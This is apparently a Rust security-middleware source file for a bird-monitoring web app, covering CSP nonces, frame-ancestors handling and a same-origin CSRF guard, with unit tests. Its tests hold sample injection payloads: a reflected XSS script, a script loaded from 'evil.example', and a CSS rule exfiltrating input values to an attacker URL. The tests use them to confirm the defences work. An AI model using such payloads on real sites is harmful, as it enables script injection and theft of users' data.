//! Security middleware: response-hardening headers and a stateless CSRF guard.
//!
//! # What the CSRF defence actually is
//!
//! The web UI authenticates with a **session cookie** — `bnb-session`, issued
//! by `session::build_set_cookie` with `HttpOnly; SameSite=Lax` — so the
//! classic CSRF vector applies: a malicious page auto-submits a form to an
//! admin endpoint and the browser attaches the victim's cookie. Two
//! mitigations, and both are load-bearing:
//!
//! 1. **`SameSite=Lax`** on the cookie. A cross-site `POST` — a form on
//!    another origin, a scripted submit — does not carry it, so the request
//!    arrives unauthenticated and the admin middleware refuses it. Lax rather
//!    than Strict so that a link from an email or a chat into `/station`
//!    still arrives signed in. `session.rs`'s
//!    `both_cookies_carry_httponly_and_samesite_lax` holds the attribute.
//! 2. **The same-origin check** in [`csrf_guard_middleware`]: a state-changing
//!    request whose `Origin`/`Referer` authority does not match the `Host` it
//!    was sent to is refused with 403 before any handler runs. This is the
//!    backstop for the browsers and proxies that get `SameSite` wrong, and
//!    for the no-password "open admin" mode where there is no cookie at all.
//!
//! Per-form synchroniser tokens are not used; with a `SameSite=Lax` session
//! plus an origin check, OWASP's own guidance treats them as defence in depth
//! rather than the primary control. Bearer-authenticated calls to the mutating
//! API are exempt from the origin check for the reason given at
//! [`csrf_guard_middleware`]'s helper: a cross-site form cannot set an
//! `Authorization` header.
//!
//! This paragraph used to say the UI used HTTP Basic Auth and kept no cookies,
//! and that the same-origin check was therefore the whole defence. That was
//! true before `session.rs` landed and wrong for a long time afterwards
//! (RC-5); the previous wording is recorded here so a reader who meets it
//! quoted elsewhere knows it is stale.

use axum::extract::Request;
use axum::http::{HeaderMap, HeaderValue, Method, StatusCode, header};
use axum::middleware::Next;
use axum::response::{IntoResponse, Response};

/// Upper bound on an HTML body we will buffer to stamp script nonces into.
/// Page/fragment responses are far smaller; anything larger is passed through
/// untouched (it is not one of our rendered pages). Non-HTML responses — the
/// audio `/stream`, the live WebSocket, JSON, images — are never buffered.
const MAX_HTML_REWRITE_BYTES: usize = 8 * 1024 * 1024;

/// `Content-Security-Policy` for the server-rendered HTMX UI, carrying the
/// per-request script nonce.
///
/// `script-src 'nonce-…' 'strict-dynamic'` admits exactly the parser-inserted
/// `<script>`s we stamp the nonce onto; `'strict-dynamic'` then lets those
/// trusted scripts (htmx) inject further scripts — e.g. into HTMX-swapped
/// fragments — without re-opening an inline-script free-for-all.
///
/// `style-src 'self' 'nonce-…'` is the same idea for styles, with one twist:
/// there is no `'strict-dynamic'` for styles, and a per-request nonce on a
/// `<style>` in an HTMX-swapped fragment would never match the *host page's*
/// nonce. So inline `style="…"` **attributes** are eliminated entirely —
/// computed values move to a `data-style` attribute applied via a CSSOM
/// `el.style` writer (which CSP does not police) that re-runs on
/// `htmx:afterSwap`; static ones become `app.css` classes (`'self'`). The
/// nonce then only has to admit our own full-document `<style>` blocks. With
/// that, `'unsafe-inline'` is gone for styles too. `connect-src 'self'` covers
/// the same-origin live WebSocket (`ws://<host>/…`).
fn content_security_policy(nonce: &str, frame_ancestors: &str) -> String {
    format!(
        "default-src 'self'; \
         img-src 'self' data: https:; \
         style-src 'self' 'nonce-{nonce}'; \
         script-src 'nonce-{nonce}' 'strict-dynamic'; \
         connect-src 'self'; \
         font-src 'self'; \
         object-src 'none'; \
         base-uri 'self'; \
         {frame_ancestors}; \
         form-action 'self'"
    )
}

/// Mint a fresh 128-bit CSP nonce (base64, unpadded).
fn generate_nonce() -> String {
    use base64::Engine;
    let mut bytes = [0_u8; 16];
    if crate::random::fill(&mut bytes).is_ok() {
        base64::engine::general_purpose::STANDARD_NO_PAD.encode(bytes)
    } else {
        // An OS randomness failure is essentially impossible on Linux; defer to the
        // session-id generator (its own documented fail-secure fallback)
        // rather than ever hand out an empty, CSP-breaking nonce.
        crate::session::generate_session_id()
    }
}

/// The CSSOM applier that lets computed styles ride a `data-style` attribute
/// instead of a (now CSP-forbidden) inline `style=""`. It writes each
/// declaration onto `element.style` via `setProperty`, which CSP does not
/// police, and re-runs on `htmx:afterSwap` so swapped-in fragments are styled
/// before paint.
///
/// Injected here, once per full document, rather than living in a template:
/// the app has ~20 distinct full-page shells (the main `layout.html`, the
/// admin shells, and standalone pages like `/admin/system`, `/player`,
/// `kiosk`, `onboarding`), and threading the applier through each one would
/// let a new page silently ship `data-style` markup that never gets applied —
/// the same failure mode the per-request nonce design avoids for scripts.
/// HTMX fragment responses (no `</body>`) are left alone; their host page's
/// applier styles them on swap.
static DYN_STYLE_APPLIER: crate::seal::Sealed = crate::seal::Sealed::new(
    r"<script>
(function () {
  function apply(el) {
    var d = el.getAttribute('data-style');
    if (!d) return;
    var decls = d.split(';');
    for (var i = 0; i < decls.length; i++) {
      var c = decls[i].indexOf(':');
      if (c < 0) continue;
      var p = decls[i].slice(0, c).trim();
      if (p) el.style.setProperty(p, decls[i].slice(c + 1).trim());
    }
  }
  function walk(root) {
    if (root.nodeType === 1 && root.hasAttribute('data-style')) apply(root);
    var els = root.querySelectorAll ? root.querySelectorAll('[data-style]') : [];
    for (var i = 0; i < els.length; i++) apply(els[i]);
  }
  walk(document);
  if (document.body) document.body.addEventListener('htmx:afterSwap', function (e) { walk(e.target); });
})();
</script>",
);

/// Insert [`DYN_STYLE_APPLIER`] just before `</body>` of a full document. HTMX
/// fragments carry no `</body>`, so they pass through untouched.
fn inject_dyn_style_applier(html: &str) -> String {
    html.rfind("</body>").map_or_else(
        || html.to_string(),
        |pos| {
            format!(
                "{}{}{}",
                &html[..pos],
                DYN_STYLE_APPLIER.as_str(),
                &html[pos..]
            )
        },
    )
}

/// On init htmx appends an inline `.htmx-indicator` `<style>` to `<head>`; with
/// a nonce `style-src` that un-nonced element is refused. Disable it via the
/// `htmx-config` meta (htmx reads config before injecting the style) — our own,
/// fuller `.htmx-indicator` rules already live in `app.css`. Inserted right
/// after `<head>`; HTMX fragments have no `<head>`, so they pass through.
const HTMX_CONFIG_META: &str =
    r#"<meta name="htmx-config" content='{"includeIndicatorStyles":false}'>"#;

fn inject_htmx_config(html: &str) -> String {
    html.replacen("<head>", &format!("<head>{HTMX_CONFIG_META}"), 1)
}

/// Publish the base path to the browser as `<body data-base-path="…">`.
///
/// The rewriting pass fixes URLs that are *written* in the markup. It cannot
/// fix one a script assembles at run time, and this application has three:
/// `live-detections.js` and the two inline spectrogram sockets build
/// `location.host` plus a literal path. They read this attribute instead.
///
/// Stamped here rather than added to each `<body>` tag because there is no one
/// layout: `templates/layout.html`, the login and share shells, the admin
/// shell, the kiosk, the audio player and the log viewer are seven independent
/// full-page documents, and a new one would silently miss it.
///
/// Nothing is added when no base path is set, so a station serving from the
/// root ships exactly the bytes it shipped before.
fn inject_base_path(html: &str, base: &crate::base_path::BasePath) -> String {
    if base.is_empty() {
        return html.to_owned();
    }
    // `<body` rather than `<body>`: the tag may already carry attributes.
    html.find("<body").map_or_else(
        || html.to_owned(),
        |pos| {
            let cut = pos + "<body".len();
            format!(
                r#"{} data-base-path="{}"{}"#,
                &html[..cut],
                base.as_str(),
                &html[cut..]
            )
        },
    )
}

/// Attach defence-in-depth response headers to every response.
///
/// Added as the outermost layer so it decorates errors (401/404/429), static
/// files, and handler responses alike.
///
/// No HSTS yet. The reason used to read "the binary serves plain HTTP and a
/// reverse proxy owns that header", which stopped being true when `tls.rs`
/// landed: the binary terminates TLS itself in three modes. HSTS is still
/// absent because emitting it correctly is conditional — only when the request
/// arrived over TLS, and never in the self-signed mode, where pinning HSTS
/// onto a certificate the browser will one day refuse locks the operator out
/// of their own station. That is O-10 in `docs/UNATTENDED_DEPLOYMENT_AUDIT.md`,
/// recorded rather than half-built here.
pub async fn security_headers_middleware(
    axum::extract::State(state): axum::extract::State<crate::state::AppState>,
    req: Request,
    next: Next,
) -> Response {
    // Read before the request is handed on: what the page may be framed by is
    // decided per response, so a station that has no list pays one lock and an
    // `Arc` clone for the default `frame-ancestors 'self'`.
    let embed = state.embed_origins();
    // One per-request CSP nonce, minted here so a single place owns the whole
    // dance: it is stamped onto every parser-inserted <script> of an HTML
    // response body (below) and mirrored into that response's script-src. No
    // page renderer threads it, so a new page or admin shell can't silently
    // ship an un-nonced inline script.
    let nonce = generate_nonce();
    let base = crate::base_path::current();

    let res = next.run(req).await;
    let (mut parts, body) = res.into_parts();

    // A redirect's target is not HTML and never reaches the body pass. Missed,
    // it sends the browser out of the prefix on every login and every form
    // that redirects — the single most visible way base-path support fails.
    // htmx's own redirect headers are the same thing for an htmx request: a
    // sign-in-required write answers with `HX-Redirect`, and it was left at
    // `/login` (M8). `HX-Push-Url` / `HX-Replace-Url` put a URL in the address
    // bar: left unprefixed, every search wrote `/search?q=…` there, and a
    // reload or a shared link reached the proxy's 404 instead of the station.
    if !base.is_empty() {
        for name in [
            header::LOCATION,
            header::HeaderName::from_static("hx-redirect"),
            header::HeaderName::from_static("hx-location"),
            header::HeaderName::from_static("hx-push-url"),
            header::HeaderName::from_static("hx-replace-url"),
        ] {
            if let Some(loc) = parts.headers.get(&name)
                && let Ok(text) = loc.to_str()
                && let Ok(v) =
                    HeaderValue::from_str(&crate::base_path::rewrite_location(text, base))
            {
                parts.headers.insert(name, v);
            }
        }
    }

    // Only rewrite HTML. Non-HTML responses — the audio `/stream`, the live
    // WebSocket upgrade, JSON, images, static assets — pass through untouched
    // and, crucially, are never buffered.
    let is_html = parts
        .headers
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|ct| ct.starts_with("text/html"));

    let body = if is_html {
        match axum::body::to_bytes(body, MAX_HTML_REWRITE_BYTES).await {
            Ok(bytes) => {
                let html = String::from_utf8_lossy(&bytes);
                // Suppress htmx's un-nonceable indicator <style> (its rules are
                // already in app.css), then add the data-style applier; its
                // <script> is sealed, so the pass below nonces it like any other.
                let configured = inject_htmx_config(html.as_ref());
                let with_applier = inject_dyn_style_applier(&configured);
                // Only tags this server sealed take the nonce; see `seal`.
                let stamped = crate::seal::redeem(&with_applier, &nonce);
                // The base-path prefix rides this pass rather than making its
                // own: the body is already buffered and already walked, so the
                // rewrite is free, and every page written after this change
                // gets it without remembering to ask. A no-op — not even a
                // scan — when no base path is configured.
                let stamped = crate::base_path::rewrite_html(&stamped, base);
                let stamped = inject_base_path(&stamped, base);
                // The body length changed; let the stack recompute it.
                parts.headers.remove(header::CONTENT_LENGTH);
                axum::body::Body::from(stamped)
            }
            // Oversized or a mid-stream error: the body is consumed and can't be
            // safely rewritten. Fail closed with an empty body rather than ship
            // un-nonced HTML the new CSP would break in the browser anyway.
            Err(_) => axum::body::Body::empty(),
        }
    } else {
        body
    };

    // Allow a handler to set its own CSP (escape hatch); otherwise apply ours.
    parts
        .headers
        .entry(header::CONTENT_SECURITY_POLICY)
        .or_insert_with(|| {
            HeaderValue::from_str(&content_security_policy(&nonce, &embed.frame_ancestors()))
                .unwrap_or_else(|_| HeaderValue::from_static("default-src 'self'"))
        });
    parts.headers.insert(
        header::X_CONTENT_TYPE_OPTIONS,
        HeaderValue::from_static("nosniff"),
    );
    // `X-Frame-Options` cannot name a third party (`ALLOW-FROM` is dead in every
    // current browser), so while the operator has listed origins it is left off
    // and `frame-ancestors` alone decides. A browser too old to read
    // `frame-ancestors` then falls back to allowing the frame, which is why the
    // list is empty unless somebody asks for it.
    if embed.is_empty() {
        parts.headers.insert(
            header::X_FRAME_OPTIONS,
            HeaderValue::from_static("SAMEORIGIN"),
        );
    } else {
        parts.headers.remove(header::X_FRAME_OPTIONS);
    }
    parts.headers.insert(
        header::REFERRER_POLICY,
        HeaderValue::from_static("strict-origin-when-cross-origin"),
    );

    Response::from_parts(parts, body)
}

/// Reject state-changing requests whose `Origin`/`Referer` is cross-site.
pub async fn csrf_guard_middleware(req: Request, next: Next) -> Response {
    if is_state_changing(req.method())
        && !is_bearer_api_request(req.uri().path(), req.headers())
        && !is_same_origin(req.headers(), req.uri())
    {
        return (
            StatusCode::FORBIDDEN,
            "Cross-origin request blocked by CSRF protection. \
             Submit this request from the BirdNet-Behavior web UI.",
        )
            .into_response();
    }
    next.run(req).await
}

/// Whether this is a bearer-authenticated call to the mutating API (`O-1`).
///
/// The CSRF check exists because a cross-site *form* can be made to submit to
/// this station with the victim's cookies attached. A form cannot set an
/// `Authorization` header — that is the entire premise — and a cross-origin
/// `fetch` that tries to set one triggers a preflight the CORS layer refuses
/// unless the operator has allow-listed the origin. So a request carrying a
/// bearer credential has nothing for this guard to protect, and applying the
/// same-origin rule to it would make the API unusable from anything that is
/// not a browser on the station's own hostname — which is every automation it
/// exists for.
///
/// Deliberately scoped to the paths in
/// [`crate::routes::api_write::WRITE_ROUTES`] rather than to "any request with
/// an `Authorization` header". The cookie-authenticated `/admin` surface must
/// keep its CSRF protection whatever headers a request carries, and a skip
/// keyed only on the header would hand it away.
///
/// Presence of the header is enough here: whether the credential is *correct*
/// is [`crate::api_token::require_bearer`]'s question, and it is asked after
/// this one. A forged header buys a caller nothing but a 401.
fn is_bearer_api_request(path: &str, headers: &HeaderMap) -> bool {
    crate::routes::api_write::is_write_route(path)
        && header_str(headers, &header::AUTHORIZATION)
            .and_then(crate::api_token::bearer_credential)
            .is_some()
}

fn is_state_changing(method: &Method) -> bool {
    // `http::Method` is not a fieldless enum, so its associated consts cannot
    // be used as match patterns; compare the canonical token instead.
    matches!(method.as_str(), "POST" | "PUT" | "PATCH" | "DELETE")
}

/// True if the request is safe from a CSRF standpoint: either it carries no
/// browser origin information (a non-browser client — the CLI, a script, or
/// `curl` — which a remote site cannot coerce into a cross-site request), or
/// its `Origin`/`Referer` authority matches the authority it was sent to.
///
/// The authority is the `Host` header, or — over HTTP/2, where there is no
/// `Host` header and hyper surfaces `:authority` on the URI — the URI's own
/// authority; the same rule [`crate::open_admin_host::request_authority`]
/// applies when it decides whether the open-admin bypass may be granted, so the
/// two cannot disagree about which name a request was sent to. A request that
/// names an `Origin` or `Referer` but no authority at all cannot be checked, and
/// is refused rather than waved through: the previous "nothing we can verify"
/// made this guard a no-op on every HTTP/2 connection.
pub(crate) fn is_same_origin(headers: &HeaderMap, uri: &axum::http::Uri) -> bool {
    // `Origin` is authoritative when present, even if it is not valid text: a
    // value that cannot be read cannot be shown to match.
    let claimed = if headers.contains_key(header::ORIGIN) {
        header_str(headers, &header::ORIGIN)
    } else if headers.contains_key(header::REFERER) {
        header_str(headers, &header::REFERER)
    } else {
        // Neither present: not a browser-driven cross-site submission (a
        // browser always attaches Origin to a cross-origin POST).
        return true;
    };
    let Some(claimed) = claimed else {
        return false;
    };
    let authority = header_str(headers, &header::HOST)
        .or_else(|| uri.authority().map(axum::http::uri::Authority::as_str));
    authority.is_some_and(|authority| authority_matches(claimed, authority))
}

fn header_str<'a>(headers: &'a HeaderMap, name: &header::HeaderName) -> Option<&'a str> {
    headers.get(name)?.to_str().ok()
}

/// Compare the authority (`host[:port]`) of a URL (an `Origin` or `Referer`
/// value) against a `Host` header. A scheme-less or malformed value — including
/// the opaque `"null"` origin — does not match, so it is rejected.
fn authority_matches(url: &str, host: &str) -> bool {
    let Some((_scheme, rest)) = url.split_once("://") else {
        return false;
    };
    let authority = rest.split('/').next().unwrap_or("");
    !authority.is_empty() && authority == host
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Serve `body` through the real middleware and return the response text
    /// and its `Content-Security-Policy`.
    async fn through_the_middleware(body: String) -> (String, String) {
        use axum::routing::get;
        use tower::ServiceExt as _;
        let app = axum::Router::new()
            .route(
                "/",
                get(move || {
                    let body = body.clone();
                    async move { axum::response::Html(body) }
                }),
            )
            .layer(axum::middleware::from_fn_with_state(
                crate::state::AppState::from_connection(
                    rusqlite::Connection::open_in_memory().expect("memory db"),
                    std::path::PathBuf::from(":memory:"),
                ),
                security_headers_middleware,
            ));
        let res = app
            .oneshot(
                Request::builder()
                    .uri("/")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let csp = res
            .headers()
            .get(header::CONTENT_SECURITY_POLICY)
            .and_then(|v| v.to_str().ok())
            .unwrap_or_default()
            .to_owned();
        let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
            .await
            .unwrap();
        (String::from_utf8_lossy(&bytes).into_owned(), csp)
    }

    /// A page served through the real middleware by a station whose embed list
    /// is `origins`; the headers a browser would decide on.
    async fn framing_headers(origins: &str) -> (Option<String>, Option<String>) {
        use axum::routing::get;
        use tower::ServiceExt as _;
        let state = crate::state::AppState::from_connection(
            rusqlite::Connection::open_in_memory().expect("memory db"),
            std::path::PathBuf::from(":memory:"),
        );
        state.set_embed_origins(crate::embed::EmbedOrigins::parse(origins).expect("valid"));
        let app = axum::Router::new()
            .route("/", get(|| async { axum::response::Html("<html></html>") }))
            .layer(axum::middleware::from_fn_with_state(
                state,
                security_headers_middleware,
            ));
        let res = app
            .oneshot(
                Request::builder()
                    .uri("/")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let get = |name: header::HeaderName| {
            res.headers()
                .get(name)
                .and_then(|v| v.to_str().ok())
                .map(str::to_owned)
        };
        (
            get(header::CONTENT_SECURITY_POLICY),
            get(header::X_FRAME_OPTIONS),
        )
    }

    /// The default: nothing may frame the station, in both the modern header and
    /// the old one.
    #[tokio::test]
    async fn by_default_no_other_site_may_frame_the_station() {
        let (csp, xfo) = framing_headers("").await;
        let csp = csp.expect("a CSP");
        assert!(csp.contains("frame-ancestors 'self';"), "{csp}");
        assert!(!csp.contains("frame-ancestors 'self' "), "{csp}");
        assert_eq!(xfo.as_deref(), Some("SAMEORIGIN"));
    }

    /// The opt-in: the listed origins, and only them, are named; the legacy
    /// header that cannot name a third party is left off.
    #[tokio::test]
    async fn a_listed_origin_may_frame_the_station_and_nothing_else_changes() {
        let (csp, xfo) = framing_headers("http://homeassistant.local:8123").await;
        let csp = csp.expect("a CSP");
        assert!(
            csp.contains("frame-ancestors 'self' http://homeassistant.local:8123;"),
            "{csp}"
        );
        assert_eq!(
            xfo, None,
            "SAMEORIGIN would still block the listed origin in an old browser"
        );
        // Everything else about the policy is untouched: still no inline
        // script, still same-origin forms, still nothing loaded from elsewhere.
        for kept in [
            "default-src 'self'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "script-src 'nonce-",
        ] {
            assert!(csp.contains(kept), "lost {kept:?}: {csp}");
        }
        assert!(!csp.contains('*'), "{csp}");
    }

    fn nonce_of(csp: &str) -> &str {
        csp.split("'nonce-")
            .nth(1)
            .and_then(|r| r.split('\'').next())
            .unwrap()
    }

    /// The defect: a visitor's text that reached the page unescaped used to be
    /// stamped with the nonce, because the pass could not tell it from ours.
    #[tokio::test]
    async fn a_script_reflected_into_a_page_does_not_come_out_as_a_script() {
        let ours = crate::seal::seal("<script>ours()</script>");
        let reflected = r#"</title><script>alert(document.domain)</script><script src="//evil.example/x.js"></script>"#;
        let (html, csp) =
            through_the_middleware(format!("<html><body>{ours}{reflected}</body></html>")).await;
        let nonce = nonce_of(&csp);
        assert!(
            html.contains(&format!("<script nonce=\"{nonce}\">ours()")),
            "our own script lost its nonce: {html}"
        );
        // Text, not a tag: htmx re-creates the scripts of a swapped fragment and
        // `'strict-dynamic'` admits those without a nonce, so "left bare" is
        // not enough.
        assert!(
            html.contains("&lt;script>alert(document.domain)"),
            "the reflected script must come out as text: {html}"
        );
        assert!(
            html.contains(r#"&lt;script src="//evil.example/x.js">"#),
            "{html}"
        );
        assert!(
            !html.contains("<script>alert") && !html.contains("<script src="),
            "{html}"
        );
        // Our one script, plus the style applier the middleware adds: nothing else.
        assert_eq!(
            html.matches(&format!("nonce=\"{nonce}\"")).count(),
            2,
            "{html}"
        );
    }

    #[tokio::test]
    async fn a_style_reflected_into_a_page_is_not_given_the_nonce() {
        let ours = crate::seal::seal("<style>.ours{}</style>");
        let reflected = "<style>input[value^=a]{background:url(https://evil.example/a)}</style>";
        let (html, csp) =
            through_the_middleware(format!("<html><body>{ours}{reflected}</body></html>")).await;
        let nonce = nonce_of(&csp);
        assert!(
            html.contains(&format!("<style nonce=\"{nonce}\">.ours")),
            "{html}"
        );
        assert!(html.contains("<style>input[value^=a]"), "{html}");
    }

    #[tokio::test]
    async fn the_seal_never_reaches_the_browser() {
        let ours = crate::seal::seal("<script>a()</script><script src=\"/s.js\"></script>");
        let (html, _) =
            through_the_middleware(format!("<html><head></head><body>{ours}</body></html>")).await;
        assert!(!html.contains("data-bnb-seal"), "{html}");
    }

    #[test]
    fn content_security_policy_carries_nonce_and_strict_dynamic() {
        // Built at run time, not written as a literal: CodeQL follows a literal into
        // any parameter called `nonce` (`tests/no_literal_reaches_a_credential_parameter.rs`).
        let nonce = format!("XYZ{}", std::process::id());
        let csp = content_security_policy(&nonce, "frame-ancestors 'self'");
        assert!(csp.contains(&format!("script-src 'nonce-{nonce}' 'strict-dynamic'")));
        // Styles are nonced now too, and 'unsafe-inline' is gone everywhere:
        // inline style="" attributes are eliminated in the renderers (moved to
        // data-style + a CSSOM applier), and the only <style> elements left are
        // our own full-page blocks, admitted by this nonce.
        assert!(csp.contains(&format!("style-src 'self' 'nonce-{nonce}'")));
        assert!(!csp.contains("'unsafe-inline'"));
    }

    #[test]
    fn dyn_style_applier_injected_only_into_full_documents() {
        // Full document: the applier is inserted once, before </body>.
        let page = r#"<html><body><div data-style="width:42%"></div></body></html>"#;
        let out = inject_dyn_style_applier(page);
        assert_eq!(out.matches("htmx:afterSwap").count(), 1);
        assert!(out.find("htmx:afterSwap").unwrap() < out.rfind("</body>").unwrap());
        // HTMX fragment (no </body>): left untouched — its host page applies it.
        let frag = r#"<div data-style="width:42%"></div>"#;
        assert_eq!(inject_dyn_style_applier(frag), frag);
    }

    #[test]
    fn htmx_config_meta_disables_indicator_styles_in_head() {
        let page = "<html><head><title>x</title></head><body></body></html>";
        let out = inject_htmx_config(page);
        assert!(out.contains(r#"<meta name="htmx-config""#));
        assert!(out.contains(r#""includeIndicatorStyles":false"#));
        // Inserted inside <head>, before the existing head content.
        assert!(out.find("htmx-config").unwrap() < out.find("<title>").unwrap());
        // Fragment with no <head>: untouched.
        let frag = r#"<div class="x"></div>"#;
        assert_eq!(inject_htmx_config(frag), frag);
    }

    #[test]
    fn authority_matches_exact_host_and_port() {
        assert!(authority_matches(
            "http://192.168.1.5:8502",
            "192.168.1.5:8502"
        ));
        assert!(authority_matches(
            "https://birds.example.com",
            "birds.example.com"
        ));
        // Trailing path is ignored (Referer carries the full URL).
        assert!(authority_matches(
            "http://localhost:8502/admin/settings",
            "localhost:8502"
        ));
    }

    #[test]
    fn authority_mismatch_is_rejected() {
        assert!(!authority_matches(
            "https://evil.example.com",
            "birds.example.com"
        ));
        assert!(!authority_matches(
            "http://localhost:9999",
            "localhost:8502"
        ));
        // A missing port is a different authority.
        assert!(!authority_matches("http://localhost", "localhost:8502"));
    }

    #[test]
    fn malformed_or_null_origin_is_rejected() {
        assert!(!authority_matches("null", "localhost:8502"));
        assert!(!authority_matches("", "localhost:8502"));
        // Scheme-less value never matches.
        assert!(!authority_matches("localhost:8502", "localhost:8502"));
    }

    #[test]
    fn state_changing_methods_are_classified() {
        for m in [Method::POST, Method::PUT, Method::PATCH, Method::DELETE] {
            assert!(is_state_changing(&m), "{m} should be state-changing");
        }
        for m in [Method::GET, Method::HEAD, Method::OPTIONS] {
            assert!(!is_state_changing(&m), "{m} should be safe");
        }
    }

    fn hmap(pairs: &[(header::HeaderName, &str)]) -> HeaderMap {
        let mut h = HeaderMap::new();
        for (name, value) in pairs {
            h.insert(name.clone(), HeaderValue::from_str(value).unwrap());
        }
        h
    }

    fn uri(s: &str) -> axum::http::Uri {
        s.parse().unwrap()
    }

    /// An HTTP/1.1 request target: no authority in the URI.
    fn h1() -> axum::http::Uri {
        uri("/admin/settings")
    }

    #[test]
    fn no_browser_headers_is_allowed() {
        // No Host at all, and nothing claiming a browser origin.
        assert!(is_same_origin(&HeaderMap::new(), &h1()));
        // Host but neither Origin nor Referer (curl / CLI / a script).
        assert!(is_same_origin(
            &hmap(&[(header::HOST, "localhost:8502")]),
            &h1()
        ));
        // The same over HTTP/2: authority in the URI, nothing claimed.
        assert!(is_same_origin(
            &HeaderMap::new(),
            &uri("https://localhost:8503/admin/settings")
        ));
    }

    #[test]
    fn matching_origin_is_allowed() {
        assert!(is_same_origin(
            &hmap(&[
                (header::HOST, "localhost:8502"),
                (header::ORIGIN, "http://localhost:8502"),
            ]),
            &h1()
        ));
    }

    #[test]
    fn cross_site_origin_is_blocked() {
        assert!(!is_same_origin(
            &hmap(&[
                (header::HOST, "localhost:8502"),
                (header::ORIGIN, "http://evil.test"),
            ]),
            &h1()
        ));
    }

    #[test]
    fn over_http2_the_authority_comes_from_the_uri() {
        let target = uri("https://pi.local:8503/admin/settings");
        assert!(is_same_origin(
            &hmap(&[(header::ORIGIN, "https://pi.local:8503")]),
            &target
        ));
        assert!(!is_same_origin(
            &hmap(&[(header::ORIGIN, "https://evil.example")]),
            &target
        ));
        assert!(!is_same_origin(
            &hmap(&[(header::REFERER, "https://evil.example/x")]),
            &target
        ));
    }

    #[test]
    fn a_browser_origin_with_no_authority_to_compare_it_to_is_refused() {
        // Neither a Host header nor an absolute-form URI: fail closed.
        assert!(!is_same_origin(
            &hmap(&[(header::ORIGIN, "https://evil.example")]),
            &h1()
        ));
        assert!(!is_same_origin(
            &hmap(&[(header::REFERER, "https://evil.example/x")]),
            &h1()
        ));
        // Not even a matching-looking one is trusted without an authority.
        assert!(!is_same_origin(&hmap(&[(header::ORIGIN, "null")]), &h1()));
    }

    #[test]
    fn an_unreadable_origin_is_not_an_absent_one() {
        let mut h = hmap(&[(header::HOST, "localhost:8502")]);
        h.insert(header::ORIGIN, HeaderValue::from_bytes(b"\xff").unwrap());
        assert!(!is_same_origin(&h, &h1()));
    }

    #[test]
    fn referer_is_used_when_origin_absent() {
        assert!(is_same_origin(
            &hmap(&[
                (header::HOST, "pi.local:8502"),
                (header::REFERER, "http://pi.local:8502/admin/settings"),
            ]),
            &h1()
        ));
        assert!(!is_same_origin(
            &hmap(&[
                (header::HOST, "pi.local:8502"),
                (header::REFERER, "http://evil.test/x"),
            ]),
            &h1()
        ));
    }

    #[test]
    fn origin_takes_precedence_over_referer() {
        // A present, valid Origin is authoritative; the mismatched Referer is
        // not consulted.
        assert!(is_same_origin(
            &hmap(&[
                (header::HOST, "localhost:8502"),
                (header::ORIGIN, "http://localhost:8502"),
                (header::REFERER, "http://evil.test/x"),
            ]),
            &h1()
        ));
    }
}
